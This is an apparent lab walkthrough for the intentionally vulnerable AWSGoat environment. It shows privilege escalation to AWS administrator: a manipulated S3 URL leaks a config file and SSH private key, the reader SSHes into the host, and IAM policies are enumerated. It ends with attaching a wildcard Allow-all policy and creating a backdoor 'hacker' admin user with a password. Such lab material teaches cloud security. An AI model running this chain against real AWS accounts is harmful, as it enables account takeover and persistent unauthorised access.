# Objective

We will try to escalate privileges to become an administrator on the AWS account.

# Solution

Open the web application put in the login credentials and start interacting with the web app.

![](https://user-images.githubusercontent.com/65826354/179528824-3ebed8f2-2853-4154-8b62-1a2b5a011bb4.png)

![](https://user-images.githubusercontent.com/65826354/179528876-be33d022-049c-4e27-abe9-34e9ce6f46f3.png)

Right-click and find the view page source option, click on that, and visit the image URL.

![](https://user-images.githubusercontent.com/65826354/179528884-e7a7fc3c-2c42-4342-b6c9-2d6a9d24455c.png)

Now, edit the URL by removing the selected part as shown in the image.

![](https://user-images.githubusercontent.com/65826354/179528899-b955f55a-ba02-49ff-968d-2a9e62b145f0.png)

After hitting enter, you will see the following message Access Denied!

![](https://user-images.githubusercontent.com/65826354/179528910-837e29a0-2431-41e2-be63-587e9506cf79.png)

Now edit the URL, replacing the word "production" with "dev" in the URL. See the image below for a better understanding

![](https://user-images.githubusercontent.com/65826354/179528921-2f0d4651-cb81-4850-8384-685b5415ceb2.png)

Copy the key as shown in the above image.

Add the copied payload at the end of the URL, as shown in the image below. And when you hit enter, one *.txt* file will start downloading.

![](https://user-images.githubusercontent.com/65826354/179528932-d4ef68b2-bb3a-4f6e-a19b-9c621a5f0d59.png)

Open that file, the file will be in .txt format, copy the host IP address from that file (given in line 1). And run the below-mentioned command.

Command:

```bash
nmap 10.25.14.6 -Pn
```

**NOTE: Here 10.25.14.6 is the host IP address**

Repeat this step with other IP addresses present in the config.txt file, until you find a vulnerable host.

![](https://user-images.githubusercontent.com/65826354/179528941-b0facbea-78e4-4c87-b712-091a9c1b47bf.png)

Inside the config.txt file, find the file path for the host's keyfile.

![](https://user-images.githubusercontent.com/65826354/179528948-90348e29-5b1e-4c16-b4a6-9bef6d7bf726.png)

Append that path at the end of the URL and hit enter. One *.pem* file will start downloading.

![](https://user-images.githubusercontent.com/65826354/179528961-315c13c6-509a-46eb-910d-cb0ba6d8a44d.png)
Run the below-mentioned command to switch to the new host.

Command:

```bash
ssh -i VincentVanGoat.pem VincentVanGoat@44.200.242.197
```

**NOTE: Here 44.200.242.197 is the host's ip address.**

Run command PWD and ls to check the present working directory and to list the files respectively.

Commands:

```bash
pwd
ls
```

![](https://user-images.githubusercontent.com/65826354/179528968-2124d04f-b47b-4e88-891c-a34f5266a615.png)


Now run the below-mentioned command for listing instance profiles so we can figure out what permissions we have.

Command:

```bash
aws iam list-instance-profiles
```

Copy the profile name from the output of the previous code, as shown in the below image.

![](https://user-images.githubusercontent.com/65826354/179528975-152aa5b0-4a52-47c0-9dfa-a56d84ea5571.png)

And run the following command

Command:

```bash
aws iam get-instance-profile --instance-profile-name AWS_GOAT_ec2_profile
```

You will get the following output

![](https://user-images.githubusercontent.com/65826354/179528982-8da8d004-4d06-4a52-b8b5-a8801ee7cc26.png)

Copy the role name as shown in the above image and run the below-mentioned command.

Command:

```bash
aws iam list-attached-role-policies --role-name AWS_GOAT_ROLE
```

You will get the following output. Copy the policy arn shown in the image below,

![](https://user-images.githubusercontent.com/65826354/179528992-024c846c-560f-40eb-ac2c-e600f3e46f8a.png)

Now, run the below-mentioned command to get the policy details of the policy, whose arn we had copied.

```bash
aws iam get-policy --policy-arn arn:aws:iam::928880666574:policy/dev-ec2-lambda-policies
```

![](https://user-images.githubusercontent.com/65826354/197143548-32f53670-8c84-4254-9759-84a0272cec39.png)

Run the below-mentioned command to get the specified version of the policy

Command:

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::928880666574:policy/dev-ec2-lambda-policies --version-id v1
```

![](https://user-images.githubusercontent.com/65826354/197149071-9e54d83e-a62a-457d-a0a1-75e13ef354b9.png)

We have a few IAM get & list permissions along with fairly permissive lambda permissions too.
Now, run the below-mentioned command to list the lambda functions in the specified region. 

Command:

```bash
aws lambda list-functions --region us-east-1
```

You will get the following output

![](https://user-images.githubusercontent.com/65826354/179529020-ade13fd7-ff87-4922-bb5b-56048ff25a08.png)

Look for the function name in the above image and run the below-mentioned command to list the policies attached to the specified role.

Command:

```bash
aws iam list-attached-role-policies --role-name blog_app_lambda_data
```

![](https://user-images.githubusercontent.com/65826354/179529025-d0e1a3d2-4f9c-4c17-93c6-ad59f9a3aea6.png)

Run the following command and specify the arn to get the policy details.

Command:

```bash
aws iam get-policy --policy-arn arn:aws:iam::928880666574:policy/lambda-data-policies
```

![](https://user-images.githubusercontent.com/65826354/197149800-ddc61398-d32e-49dd-a49f-b743f19dc220.png)

To get the specific version of the specified policy, run the following command

Command:

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::928880666574:policy/lambda-data-policies --version-id v1
```

You will get the following output

![](https://user-images.githubusercontent.com/65826354/197150176-1a397ad9-bf52-473e-981f-2198de82be6d.png)

These are restrictive policies, we will try to attach a more generous policy.
Now, create a new file, *full_policy.json* with the help of nano editor. Run-

Command:

```bash
nano full_policy.json
```

And paste the below-mentioned code into that file

code:

```json
{
"Version": "2012-10-17",
"Statement": [
    {
  "Effect":"Allow",
  "Action":"*",
  "Resource":"*"
    }
  ]
}
```

![](https://user-images.githubusercontent.com/65826354/179529045-98135319-1cfe-4128-883d-7e007702579b.png)

Save this file.

And create a new policy using the *full_policy.json* file. Run the below-mentioned command to do so.

Command:

```bash
aws iam create-policy --policy-name escalation_policy --policy-document file://full_policy.json
```

![](https://user-images.githubusercontent.com/65826354/179529057-0f40ef17-9d29-491a-b582-844b98cbd078.png)

Copy the policy arn from the above output and attach this policy to the role with the help of the following command

Command:

```bash
aws iam attach-role-policy --role-name blog_app_lambda_data --policy-arn arn:aws:iam::928880666574:policy/escalation_policy
```

Move to the terminal with the blog-application-data functions' aws credentials and verify the current identity. The Arn should look like the image below (with a different account number).

Command:

```bash
aws sts get-caller-identity
```
![](https://user-images.githubusercontent.com/65826354/179529067-6026dab3-d261-4c22-8d01-47504d040a08.png)

Now, let's create a new user

Run-

Command:

```bash
aws iam create-user --user-name hacker
```

![](https://user-images.githubusercontent.com/65826354/179529077-a6edb84a-cd0c-4e56-8e9f-1614c6e96b32.png)

We successfully created a new user named, "hacker".

Now, attach the AdministratorAccess policy to "hacker" user and provide administrator privileges.

Run-

Command:

```bash
aws iam attach-user-policy --user-name hacker --policy-arn arn:aws:iam:policy/AdministratorAccess
```

Let's create a login profile for "hacker" user with the help of the following command.

Command:

```bash
aws iam create-login-profile --user-name hacker --password HackerPassword@123
```

![](https://user-images.githubusercontent.com/65826354/179529081-c182d3a3-3c52-4778-a688-16f7baf0d8b7.png)

Login profile created successfully!

Let's try to login into the aws account using "hacker" user's credentials. Copy the credentials from the above step or refer to the images given below.

![](https://user-images.githubusercontent.com/65826354/179529090-e478ea16-1c65-4358-84a5-30584ab00595.png)

![](https://user-images.githubusercontent.com/65826354/179529094-d954f864-45f0-4d00-bbf7-5f09fa36d141.png)

![](https://user-images.githubusercontent.com/65826354/179529102-b959e05b-81f5-4cdb-95a2-c78904776a7e.png)

**Voila! We successfully logged in as a "hacker" user with administrative access.**
